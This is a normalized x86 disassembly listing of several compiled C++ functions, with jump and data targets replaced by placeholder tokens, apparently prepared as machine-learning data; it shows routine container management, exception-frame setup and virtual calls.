mov [ ebp + 0x8 ] esi
mov ecx edi
call sub_413c10
add edi 0xa0
cmp edi ebx
jne r-xdata
sub_415060
push ebp
mov ebp esp
push 0xffffffff
push sub_4bf6ab
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xac
mov eax [ ebp + 0x10 ]
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x10 ] esp
push eax
lea ecx [ ebp - 0xb8 ]
mov [ ebp - 0x14 ] esi
call sub_413d70
mov ebx [ esi + 0x4 ]
xor ecx ecx
cmp ebx ecx
mov [ ebp - 0x4 ] ecx
je r-xdata
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
mov ecx [ esi + 0xc ]
sub ecx ebx
mov eax 0x66666667
imul ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add edx ecx
mov ecx edx
lea ecx [ ebp - 0xb8 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_413c10
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0xc
test ebx ebx
jne r-xdata
mov edx [ esi + 0x8 ]
sub edx ebx
mov eax 0x66666667
imul edx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
test ebx ebx
jne r-xdata
mov ecx esi
call sub_40bf80
mov eax 0x1999999
sub eax edx
cmp eax edi
jae r-xdata
mov edx [ esi + 0x8 ]
sub edx ebx
mov eax 0x66666667
imul edx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov edx ecx
sub edx ebx
mov eax 0x66666667
imul edx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
cmp edx edi
mov [ ebp + 0x10 ] ecx
jae r-xdata
mov eax ecx
shr eax 0x1
mov edx 0x1999999
sub edx eax
cmp edx ecx
jae r-xdata
add edx edi
cmp ecx edx
jae r-xdata
push ecx
push ecx
mov eax esp
mov [ ebp + 0x8 ] esp
push ecx
mov [ eax ] ecx
lea edi [ edi + edi * 4 ]
shl edi 0x5
sub ecx edi
mov eax esp
mov [ ebp + 0x8 ] esp
mov [ ebp + 0x8 ] ecx
mov [ eax ] ecx
mov ecx esi
call sub_414f20
mov edx [ ebp + 0x8 ]
mov [ esi + 0x8 ] eax
push ecx
mov ecx [ ebp + 0x10 ]
mov eax esp
mov [ ebp + 0xc ] esp
mov [ eax ] ecx
push ecx
mov eax esp
mov [ ebp + 0xc ] esp
push ecx
mov [ eax ] edx
mov eax esp
mov [ eax ] ebx
lea eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] esp
push eax
call sub_414d90
add esp 0x10
lea ecx [ ebp - 0xb8 ]
push ecx
push ecx
mov eax esp
add edi ebx
mov [ eax ] edi
lea eax [ edi + edi * 4 ]
shl eax 0x5
mov [ ebp + 0x10 ] eax
add eax ebx
push eax
push ecx
mov eax esp
mov [ ebp - 0x18 ] esp
push ecx
mov [ eax ] ecx
mov eax esp
mov ecx esi
mov [ ebp - 0x18 ] esp
mov [ eax ] ebx
call sub_414f20
mov ecx [ esi + 0x8 ]
lea edx [ ebp - 0xb8 ]
push edx
mov edx ecx
sub edx ebx
mov eax 0x66666667
imul edx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
sub edi edx
push edi
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x3
call sub_414fd0
mov edx [ esi + 0x8 ]
mov ecx [ ebp + 0x10 ]
add edx ecx
mov [ esi + 0x8 ] edx
mov esi edx
lea edx [ ebp - 0xb8 ]
push edx
push ecx
mov eax esp
sub esi ecx
mov [ ebp - 0x4 ] 0x0
mov [ eax ] esi
jmp r-xdata
add ecx eax
xor ecx ecx
jmp r-xdata
mov [ ebp + 0x8 ] esp
push ecx
mov eax esp
mov [ eax ] ebx
mov [ ebp + 0x8 ] esp
call sub_414cd0
add esp 0xc
mov edx [ esi + 0x8 ]
sub edx ebx
mov eax 0x66666667
imul edx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
test ebx ebx
jne r-xdata
lea ebx [ ecx + ecx * 4 ]
shl ebx 0x5
push ebx
call sub_4b573e
mov edx [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
add esp 0x4
push edx
mov edx [ ebp + 0x8 ]
push esi
push eax
push ecx
mov [ ebp + 0x10 ] eax
mov [ ebp + 0xc ] eax
mov eax esp
mov [ eax ] edx
push ecx
mov eax esp
mov [ ebp - 0x4 ] 0x1
mov [ eax ] ecx
call sub_414dd0
mov ecx [ ebp + 0x8 ]
add esp 0x14
push ecx
push esi
lea edx [ ebp - 0xb8 ]
push edx
push edi
push eax
mov [ ebp + 0xc ] eax
call sub_414e70
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
add esp 0x14
push edx
lea eax [ edi + edi * 4 ]
shl eax 0x5
add ecx eax
mov eax [ esi + 0x8 ]
push esi
push ecx
push ecx
mov [ ebp + 0xc ] ecx
mov ecx esp
mov [ ecx ] eax
push ecx
mov ecx [ ebp + 0x8 ]
mov eax esp
mov [ eax ] ecx
call sub_414dd0
mov ecx [ esi + 0x4 ]
xor edx edx
add esp 0x14
cmp ecx edx
mov [ ebp - 0x4 ] edx
je r-xdata
mov ecx esi
call sub_40af70
mov ecx eax
add ecx edi
add edx edi
cmp ecx edx
jae r-xdata
add edi edx
test ecx ecx
je r-xdata
mov edx [ esi + 0x8 ]
sub edx ecx
mov eax 0x66666667
imul edx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
mov eax [ ebp + 0x10 ]
lea ecx [ edi + edi * 4 ]
add ebx eax
shl ecx 0x5
add ecx eax
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] ecx
mov [ esi + 0x4 ] eax
jmp r-xdata
mov edx [ esi + 0x8 ]
push edx
push ecx
mov ecx esi
call sub_414f50
mov eax [ esi + 0x4 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_4153d0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4bf6c8
push eax
mov [ fs : 0x0 ] esp
push ebx
push esi
push edi
mov esi [ ecx + 0x4 ]
test esi esi
mov [ esp + 0x14 ] 0x0
jne r-xdata
mov edx [ ecx + 0x8 ]
sub edx esi
mov eax 0x66666667
imul edx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov edi [ esp + 0x1c ]
cmp edx edi
jae r-xdata
lea ecx [ esp + 0x20 ]
mov [ esp + 0x14 ] 0xffffffff
call sub_413c10
mov ecx [ esp + 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0xc
retn 0xa4
mov ebx [ ecx + 0x8 ]
mov edx ebx
sub edx esi
mov eax 0x66666667
imul edx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
cmp edi edx
jae r-xdata
mov edx [ ecx + 0x8 ]
sub edx esi
mov eax 0x66666667
imul edx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
push ecx
mov eax esp
mov [ esp + 0x20 ] esp
mov [ eax ] ebx
mov eax [ ecx + 0x4 ]
push ecx
lea esi [ edi + edi * 4 ]
mov edx esp
shl esi 0x5
add esi eax
mov [ edx ] esi
lea edx [ esp + 0x24 ]
mov [ esp + 0x24 ] esp
push edx
call sub_415000
lea eax [ esp + 0x20 ]
push eax
sub edi edx
mov edx [ ecx + 0x8 ]
push edi
push ecx
mov eax esp
mov [ esp + 0x28 ] esp
mov [ eax ] edx
call sub_415060
jmp r-xdata
sub_4154c0
push ebx
mov ebx [ esp + 0xc ]
push esi
mov esi ecx
push edi
mov edi [ esi + 0x4 ]
test edi edi
je r-xdata
xor edi edi
jmp r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edi
mov eax 0x66666667
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
mov [ esp + 0x14 ] edx
jne r-xdata
mov edx [ esp + 0x18 ]
push edx
push 0x1
push ecx
mov eax esp
mov ecx esi
mov [ eax ] ebx
call sub_415060
mov eax [ esi + 0x4 ]
lea ecx [ edi + edi * 4 ]
shl ecx 0x5
pop edi
add ecx eax
mov eax [ esp + 0xc ]
pop esi
mov [ eax ] ecx
pop ebx
retn 0xc
mov ecx ebx
sub ecx edi
mov eax 0x66666667
imul ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add edx ecx
mov edi edx
sub_415540
push 0xffffffff
push sub_4bf6fe
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebx
push ebp
push esi
mov esi ecx
push edi
mov [ esp + 0x10 ] esi
mov [ esi ] r--data
xor ebx ebx
mov [ esp + 0x1c ] 0x2
xor ebp ebp
cmp [ esi + 0x98 ] 0x10
jb r-xdata
mov eax [ esi + 0x3c ]
sub eax ecx
sar eax 0x2
cmp ebp eax
jae r-xdata
mov [ esi + 0x98 ] 0xf
mov [ esi + 0x94 ] ebx
mov [ esi + 0x84 ] bl
mov eax [ esi + 0x38 ]
cmp eax ebx
je r-xdata
mov eax [ esi + 0x84 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov eax ecx
mov edi [ eax + ebp * 4 ]
cmp edi ebx
je r-xdata
mov [ esi + 0x38 ] ebx
mov [ esi + 0x3c ] ebx
mov [ esi + 0x40 ] ebx
mov edi [ esi + 0x28 ]
cmp edi ebx
je r-xdata
push eax
call j_sub_4b66ed#2
add esp 0x4
inc ebp
jmp r-xdata
mov ecx edi
call sub_40b730
push edi
call j_sub_4b66ed#2
add esp 0x4
mov [ esi + 0x28 ] ebx
mov [ esi + 0x2c ] ebx
mov [ esi + 0x30 ] ebx
mov eax [ esi + 0x18 ]
cmp eax ebx
je r-xdata
mov ebp [ esi + 0x2c ]
cmp edi ebp
je r-xdata
mov ecx [ esi + 0x38 ]
cmp ecx ebx
je r-xdata
lea edi [ esi + 0x4 ]
mov [ esi + 0x18 ] ebx
mov [ esi + 0x1c ] ebx
mov [ esi + 0x20 ] ebx
mov eax [ edi + 0x4 ]
cmp eax ebx
je r-xdata
push eax
call j_sub_4b66ed#2
add esp 0x4
mov ecx [ esi + 0x28 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
mov ecx edi
call sub_413c10
add edi 0xa0
cmp edi ebp
jne r-xdata
mov ecx [ esp + 0x14 ]
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] ebx
pop edi
mov [ esi ] r--data
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn
mov edx [ esp + 0x10 ]
mov ecx [ edi + 0x8 ]
push edx
push edi
push ecx
push eax
call sub_402270
mov edx [ edi + 0x4 ]
push edx
call j_sub_4b66ed#2
add esp 0x14
sub_415680
lea eax [ esp - 0x44 ]
sub esp 0x44
push eax
call sub_4a9c60
mov cl [ esp + 0x3c ]
add esp 0x4
xor eax eax
test cl 0x1
je r-xdata
test cl 0x2
je r-xdata
mov eax 0x4
test cl 0x4
je r-xdata
or eax 0x18
test cl 0x8
je r-xdata
or eax 0x20
add esp 0x44
retn 0x4
or eax 0x40
sub_4156f0
push ecx
mov ecx [ esp + 0x1c ]
mov eax ecx
cdq
and edx 0x3
add eax edx
push ebp
mov ebp eax
sar ebp 0x2
lea eax [ ebp * 4 ]
sub ecx eax
mov eax [ esp + 0x24 ]
test eax eax
mov [ esp + 0x4 ] ecx
jle r-xdata
pop ebp
pop ecx
retn 0x1c
mov edx [ esp + 0x10 ]
push ebx
push esi
mov [ esp + 0x28 ] eax
mov eax [ esp + 0x20 ]
push edi
mov edi [ esp + 0x10 ]
test edi edi
jle r-xdata
mov esi eax
mov ecx edx
sub esi edx
mov edi ebp
mov ebx ebp
mov edi [ esp + 0x20 ]
mov esi [ esp + 0x28 ]
mov ecx [ esp + 0x2c ]
add eax esi
add edx edi
dec ecx
mov [ esp + 0x24 ] eax
mov [ esp + 0x2c ] ecx
jne r-xdata
mov esi eax
lea ecx [ edx + ebx * 4 ]
sub esi edx
mov eax [ esi + ecx ]
mov [ ecx ] eax
add ecx 0x4
dec edi
jne r-xdata
mov eax [ esp + 0x24 ]
xor ebx ebx
test ebp ebp
jle r-xdata
pop edi
pop esi
pop ebx
mov bl [ ecx + esi ]
mov [ ecx ] bl
inc ecx
dec edi
jne r-xdata
sub_415790
push ecx
mov ecx [ esp + 0x10 ]
test ecx ecx
mov eax [ esp + 0xc ]
mov [ esp ] 0x0
mov [ eax ] 0x0
je r-xdata
pop ecx
retn 0x1c
cmp [ ecx ] 0x1
jne r-xdata
dec [ ecx ]
mov edx [ ecx + 0x4 ]
dec [ edx + 0xc ]
sub_4157f0
mov ecx [ esp + 0x8 ]
sub esp 0x204
lea eax [ esp + 0x210 ]
push eax
push ecx
lea edx [ esp + 0xc ]
push edx
call sub_4b68d6
mov eax r--data
add esp 0xc
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
push esi
mov esi [ esp + 0x20c ]
sub eax edx
add esi 0x80
push eax
push r--data
mov ecx esi
call sub_401cc0
lea eax [ esp + 0x8 ]
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx esi
call sub_401cc0
mov eax r--data
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
mov ecx esi
call sub_401cc0
push r--data
lea edx [ esp + 0x8 ]
lea ecx [ esp + 0xc ]
push edx
mov [ esp + 0xc ] ecx
call sub_4b5bd2
pop esi
nop
sub_415890
push 0xffffffff
push sub_4bf79d
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x44
push ebx
push ebp
push esi
xor ebx ebx
push edi
mov [ esp + 0x14 ] ebx
mov esi [ esp + 0x64 ]
mov eax [ esi + 0x28 ]
mov [ esp + 0x5c ] 0x1
mov [ esp + 0x10 ] ebx
mov [ esp + 0x18 ] eax
lea esp [ esp ]
mov ebp [ esp + 0x64 ]
mov eax [ ebp + 0x28 ]
test eax eax
jne r-xdata
mov ecx [ esi + 0x2c ]
sub ecx eax
mov eax 0x66666667
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
cmp [ esp + 0x10 ] edx
jae r-xdata
mov ecx [ ebp + 0x2c ]
sub ecx eax
mov eax 0x66666667
imul ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
mov eax [ esp + 0x6c ]
mov esi [ esi + 0x28 ]
lea edx [ eax + 0x1 ]
mov edi edi
mov eax [ ebp + 0x28 ]
lea ebx [ ecx + ecx * 4 ]
shl ebx 0x5
cmp [ ebx + eax ] 0x1
mov [ esp + 0x18 ] ebx
jne r-xdata
mov edx [ esp + 0x6c ]
mov ecx [ ebp ]
push edx
push r--data
push ebp
call [ ecx + 0x14 ]
mov esi [ esp + 0x74 ]
add esp 0xc
mov [ esi ] 0x76
cmp [ esp + 0x70 ] 0x63
mov [ esp + 0x14 ] 0x1
mov [ esp + 0x5c ] 0x0
jne r-xdata
mov ecx [ esp + 0x10 ]
cmp ecx edx
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
mov edx [ ebx + esi + 0x24 ]
test edx edx
je r-xdata
mov edx [ ebx + eax + 0x9c ]
mov edi [ esp + 0x70 ]
mov esi [ esp + 0x74 ]
push ebp
push edx
sub esp 0x8
cmp di 0x63
mov [ esp + 0x74 ] esp
mov eax esp
jne r-xdata
push 0x30
call sub_4b573e
mov esi eax
add esp 0x4
mov [ esp + 0x6c ] esi
test esi esi
mov edi [ esp + 0x74 ]
mov [ esp + 0x5c ] 0x2
je r-xdata
mov eax esi
jmp r-xdata
mov ecx [ esp + 0x74 ]
test ecx ecx
je r-xdata
cmp edx eax
jb r-xdata
cmp edx eax
mov ecx edx
jb r-xdata
lea edx [ esp + 0x3c ]
mov [ eax ] edi
mov [ eax + 0x4 ] esi
mov eax [ ebp + 0x18 ]
push edx
call [ eax + ecx * 4 ]
add esp 0x14
cmp [ eax ] 0x63
jne r-xdata
test esi esi
je r-xdata
xor edx edx
xor esi esi
cmp [ esp + 0x70 ] 0x61
jne r-xdata
mov ecx [ esp + 0x54 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x50
retn 0x18
dec [ ecx + 0x4 ]
jne r-xdata
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x18 ]
mov esi [ esp + 0x64 ]
inc ecx
mov [ esp + 0x10 ] ecx
add ebx 0xa0
jmp r-xdata
xor ecx ecx
cmp edx eax
setne cl
mov ebp ecx
test ebp ebp
je r-xdata
cmp [ ebx + esi + 0x28 ] 0x10
jb r-xdata
mov ecx eax
cmp [ esp + 0x2c ] 0x63
mov ecx [ eax ]
mov ebp [ esp + 0x68 ]
mov [ ebp ] ecx
mov edx [ eax + 0x4 ]
mov [ ebp + 0x4 ] edx
mov [ esp + 0x14 ] 0x1
mov [ esp + 0x5c ] 0x1
jne r-xdata
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
inc [ esi + 0x4 ]
mov eax [ ebx + eax + 0x54 ]
sub eax ecx
sar eax 0x3
xor eax eax
jmp r-xdata
lea ecx [ esp + 0x70 ]
cmp [ esp + 0x72 ] 0x0
mov ecx edi
jg r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x18 ]
test eax eax
je r-xdata
lea esi [ ebx + esi + 0x14 ]
mov esi [ ebx + esi + 0x14 ]
jmp r-xdata
cmp di 0x63
mov [ esp + 0x5c ] 0x0
jne r-xdata
mov eax [ esp + 0x30 ]
test eax eax
je r-xdata
inc [ ecx + 0x4 ]
test esi esi
mov [ esp + 0x5c ] 0x4
je r-xdata
inc [ esi + 0x4 ]
sub esp 0x8
mov ecx esp
mov [ esp + 0x74 ] esp
mov [ ecx ] 0x76
push eax
lea ecx [ esp + 0x50 ]
call sub_40d900
test esi esi
mov [ esp + 0x2c ] 0x63
mov [ esp + 0x30 ] esi
je r-xdata
mov [ esp + 0x48 ] edx
mov [ esp + 0x4c ] edx
mov [ esp + 0x50 ] edx
mov eax [ ebp + 0x28 ]
mov ecx [ ebx + eax + 0x50 ]
cmp ecx edx
mov [ esp + 0x5c ] 0x3
jne r-xdata
push ecx
mov edx esp
mov [ esp + 0x20 ] esp
push edx
call sub_40a400
mov ecx esi
call sub_40a9b0
mov esi eax
xor edx edx
jmp r-xdata
test ebp ebp
jne r-xdata
sbb ebp ebp
sbb ebp 0xffffffff
mov edi [ esp + 0x6c ]
xor ebp ebp
[ esi ] [ edi ]
je r-xdata
mov eax ebp
test esi esi
je r-xdata
mov ebx [ eax + 0x4 ]
mov ecx eax
add eax 0x4
dec ebx
mov edx ebx
test edx edx
mov [ eax ] ebx
jne r-xdata
mov ebx [ esp + 0x48 ]
cmp [ ebx ] 0x63
jne r-xdata
inc [ esi + 0x4 ]
dec [ esi + 0x4 ]
jne r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x18 ]
test esi esi
mov ecx [ esp + 0x2c ]
mov [ ebx ] ecx
mov [ ebx + 0x4 ] esi
mov [ esp + 0x5c ] 0x3
je r-xdata
mov ecx [ ebx + 0x4 ]
test ecx ecx
je r-xdata
mov edx [ esi ]
push 0x1
mov ecx esi
call [ edx + 0x18 ]
mov eax [ esp + 0x48 ]
mov esi [ esp + 0x20 ]
mov edx [ esp + 0x70 ]
mov ebp 0x1
lea ebx [ edi + 0x8 ]
add eax 0xc
dec [ esi + 0x4 ]
jne r-xdata
dec [ ecx + 0x4 ]
jne r-xdata
mov edi [ esp + 0x4c ]
mov edx [ esp + 0x48 ]
mov eax edi
sub eax edx
sar eax 0x3
mov [ esp + 0x2c ] 0x61
mov [ esp + 0x30 ] edx
mov [ esp + 0x2e ] ax
mov esi [ esp + 0x64 ]
mov eax [ esi + 0x18 ]
mov ecx [ esp + 0x10 ]
mov ecx [ eax + ecx * 4 ]
mov eax [ esi + 0x28 ]
push esi
mov esi [ esp + 0x1c ]
mov eax [ esi + eax + 0x9c ]
mov esi [ esp + 0x30 ]
push eax
sub esp 0x8
mov eax esp
mov [ eax + 0x4 ] edx
lea edx [ esp + 0x34 ]
mov [ esp + 0x74 ] esp
push edx
mov [ esp + 0x70 ] 0xa
mov [ eax ] esi
call ecx
add esp 0x14
cmp [ eax ] 0x63
jne r-xdata
mov eax [ edi + eax + 0x54 ]
sub eax ecx
sar eax 0x3
cmp ebp eax
jae r-xdata
mov edx [ esi ]
push 0x1
mov ecx esi
call [ edx + 0x14 ]
mov eax [ ecx ]
push 0x1
call [ eax + 0x14 ]
mov ebp [ eax ]
mov ebx [ eax + 0x4 ]
mov [ esp + 0x1c ] ebp
mov [ esp + 0x20 ] ebx
cmp [ esp + 0x24 ] 0x63
mov [ esp + 0x5c ] 0xd
jne r-xdata
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
mov di 0x76
mov [ esp + 0x1c ] di
cmp dx 0x61
mov cx [ esp + 0x72 ]
mov [ esp + 0x5c ] 0x5
jne r-xdata
push 0x40
call sub_4b573e
mov esi eax
add esp 0x4
mov [ esp + 0x64 ] esi
test esi esi
mov [ esp + 0x5c ] 0xe
je r-xdata
mov eax [ esp + 0x28 ]
test eax eax
je r-xdata
inc [ ecx + 0x4 ]
lea eax [ esp + 0x70 ]
test ebp ebp
jl r-xdata
xor eax eax
push ecx
mov ecx esp
mov [ esp + 0x70 ] esp
push ecx
lea ecx [ esp + 0x24 ]
call sub_40a400
mov ecx esi
call sub_40a760
jmp r-xdata
mov esi [ eax + 0x4 ]
mov ecx eax
add eax 0x4
dec esi
mov edx esi
test edx edx
mov [ eax ] esi
jne r-xdata
cmp dx 0x61
jne r-xdata
cmp dx 0x61
jne r-xdata
movsx eax cx
cmp ebp eax
mov eax ebx
jl r-xdata
mov ebx [ esp + 0x48 ]
cmp ebx edi
mov [ esp + 0x5c ] 0x1
mov esi ebx
je r-xdata
test ebx ebx
je r-xdata
mov ecx [ esp + 0x68 ]
push eax
mov [ esp + 0x60 ] 0xd
call sub_415f40
cmp bp 0x63
mov [ esp + 0x14 ] 0x1
mov [ esp + 0x5c ] 0xa
jne r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x14 ]
lea eax [ esp + 0x70 ]
test ebp ebp
jl r-xdata
lea eax [ esp + 0x70 ]
test ebp ebp
jl r-xdata
cmp [ eax ] 0x62
jne r-xdata
push ebx
call j_sub_4b66ed#2
add esp 0x4
cmp [ esp + 0x70 ] 0x63
mov [ esp + 0x5c ] 0x0
jne r-xdata
lea ebx [ ebx ]
dec [ ebx + 0x4 ]
jne r-xdata
cmp dx 0x61
jne r-xdata
cmp dx 0x61
jne r-xdata
movsx eax cx
cmp ebp eax
mov eax ebx
jl r-xdata
mov di [ esp + 0x1c ]
cmp di 0x63
mov [ esp + 0x20 ] esi
mov [ esp + 0x5c ] 0x5
jne r-xdata
movsx ecx cx
cmp ebp ecx
mov eax ebx
jl r-xdata
mov eax [ esp + 0x68 ]
jmp r-xdata
mov ecx [ esp + 0x74 ]
test ecx ecx
je r-xdata
mov ecx esi
call sub_40b100
add esi 0x8
cmp esi edi
jne r-xdata
mov edx [ ebx ]
push 0x1
mov ecx ebx
call [ edx + 0x14 ]
lea eax [ esp + 0x70 ]
test ebp ebp
jl r-xdata
lea eax [ esp + 0x70 ]
test ebp ebp
jl r-xdata
cmp [ eax ] 0x69
jne r-xdata
mov eax [ esp + 0x6c ]
cmp [ eax - 0x4 ] 0x63
jne r-xdata
test esi esi
je r-xdata
mov al [ eax + 0x4 ]
mov [ esp + 0x2c ] 0x62
mov [ esp + 0x30 ] al
mov eax [ esp + 0x2c ]
mov esi [ esp + 0x30 ]
mov [ esp + 0x1c ] eax
jmp r-xdata
dec [ ecx + 0x4 ]
jne r-xdata
cmp dx 0x61
jne r-xdata
cmp ax 0x69
jne r-xdata
movsx eax cx
cmp ebp eax
mov eax ebx
jl r-xdata
mov esi eax
movsx ecx cx
cmp ebp ecx
mov eax ebx
jl r-xdata
cmp di 0x63
mov eax [ esp + 0x6c ]
mov ecx [ esp + 0x1c ]
mov [ eax - 0x4 ] ecx
mov [ eax ] esi
mov [ esp + 0x5c ] 0x3
jne r-xdata
mov ecx eax
mov ecx [ ecx ]
test ecx ecx
je r-xdata
inc [ esi + 0x4 ]
mov eax [ ecx ]
push 0x1
call [ eax + 0x18 ]
lea eax [ esp + 0x70 ]
test ebp ebp
jl r-xdata
cmp dx 0x61
jne r-xdata
mov ax [ eax ]
cmp ax 0x66
je r-xdata
mov eax [ eax + 0x4 ]
mov [ esp + 0x34 ] 0x69
mov ecx [ esp + 0x34 ]
jmp r-xdata
mov eax [ esp + 0x6c ]
inc ebp
add ebx 0x8
add eax 0x8
jmp r-xdata
test esi esi
je r-xdata
dec [ ecx + 0x4 ]
jne r-xdata
mov eax [ eax + 0x4 ]
mov [ esp + 0x28 ] eax
fild [ eax + 0x4 ]
fstp [ esp + 0x28 ]
jmp r-xdata
movsx ecx cx
cmp ebp ecx
mov eax ebx
jl r-xdata
lea eax [ esp + 0x70 ]
test ebp ebp
jl r-xdata
mov ecx [ esp + 0x64 ]
mov edi [ esp + 0x18 ]
mov [ esp + 0x6c ] eax
mov eax [ ecx + 0x28 ]
mov ecx [ edi + eax + 0x50 ]
test ecx ecx
je r-xdata
dec [ esi + 0x4 ]
jne r-xdata
mov edx [ ecx ]
push 0x1
call [ edx + 0x14 ]
mov edx [ esp + 0x70 ]
mov [ esp + 0x1c ] ecx
mov [ esp + 0x24 ] 0x66
mov ecx [ esp + 0x24 ]
mov esi [ esp + 0x28 ]
jmp r-xdata
cmp [ eax ] 0x69
jne r-xdata
cmp dx 0x61
jne r-xdata
movsx eax cx
cmp ebp eax
mov eax ebx
jl r-xdata
mov edx [ esi ]
push 0x1
mov ecx esi
call [ edx + 0x14 ]
mov edx [ esp + 0x70 ]
lea eax [ esp + 0x70 ]
test ebp ebp
jl r-xdata
cmp [ eax ] 0x73
jne r-xdata
xor eax eax
mov eax [ eax + 0x4 ]
jmp r-xdata
movsx ecx cx
cmp ebp ecx
mov eax ebx
jl r-xdata
mov [ esp + 0x3c ] 0x73
mov ecx [ esp + 0x3c ]
cmp [ eax ] 0x73
jne r-xdata
sub_415f60
push ecx
push ebx
push ebp
mov ebp [ esp + 0x10 ]
mov ecx [ ebp + 0x38 ]
push esi
xor ebx ebx
lea esi [ ebp + 0x34 ]
push edi
mov [ esp + 0x10 ] ebx
xor edi edi
mov ecx [ esi + 0x4 ]
cmp ecx ebx
jne r-xdata
mov eax [ esi + 0x8 ]
sub eax ecx
sar eax 0x2
cmp edi eax
jae r-xdata
mov eax [ esi + 0x8 ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x38 ]
mov eax [ eax + edi * 4 ]
mov eax [ eax ]
cmp eax ebx
je r-xdata
mov eax [ esp + 0x24 ]
mov ecx [ esp + 0x20 ]
mov edx [ ebp + 0x38 ]
mov esi [ esp + 0x1c ]
push eax
mov eax [ edx + edi * 4 ]
push ecx
push esi
push eax
call sub_416060
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
pop ecx
retn 0x10
mov ecx [ esi + 0x4 ]
cmp ecx ebx
je r-xdata
cmp edi eax
jne r-xdata
mov edx [ eax + 0x4 ]
cmp [ edx + 0xc ] ebx
je r-xdata
push 0x10
call sub_4b573e
add esp 0x4
cmp eax ebx
je r-xdata
mov eax [ esi + 0x8 ]
sub eax ecx
sar eax 0x2
cmp eax 0x64
jbe r-xdata
inc edi
jmp r-xdata
xor eax eax
mov [ eax ] ebx
mov [ eax + 0x4 ] bl
mov [ eax + 0x8 ] ebx
mov [ eax + 0xc ] ebx
jmp r-xdata
mov eax [ ebp ]
push 0x64
push r--data
push ebp
call [ eax + 0x14 ]
add esp 0xc
cmp ecx ebx
je r-xdata
lea edx [ esp + 0x18 ]
push edx
mov ecx esi
call sub_417fb0
mov ecx [ esi + 0x4 ]
cmp ecx ebx
jne r-xdata
cmp eax ebx
mov [ esp + 0x18 ] eax
jne r-xdata
mov eax [ esi + 0x8 ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
mov ecx [ ebp ]
push eax
push r--data
push ebp
call [ ecx + 0x14 ]
add esp 0xc
sub_416060
sub esp 0x14
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x34 ]
xor ecx ecx
cmp edi 0x4
mov [ esp + 0x20 ] ecx
jge r-xdata
mov esi [ esp + 0x30 ]
mov al [ esi + 0x14 ]
test al al
jne r-xdata
mov edi 0x4
cmp al 0x22
jne r-xdata
mov [ esp + 0x34 ] 0x8
jmp r-xdata
cmp al 0x13
jne r-xdata
mov [ esp + 0x34 ] 0x10
jmp r-xdata
mov eax [ esi ]
imul eax [ esp + 0x34 ]
mov ebx [ esi + 0x4 ]
cdq
and edx 0x7
add eax edx
mov ebp eax
lea eax [ edi - 0x1 ]
sar ebp 0x3
mov [ esp + 0x18 ] eax
not eax
lea esi [ edi + ebp - 0x1 ]
and esi eax
mov eax [ esp + 0x34 ]
mov [ esp + 0x1c ] ecx
mov [ esp + 0x14 ] ecx
mov [ esp + 0x20 ] ecx
mov ecx esi
imul ecx ebx
cmp eax 0x8
lea edx [ ecx + edi - 0x1 ]
mov [ esp + 0x10 ] edx
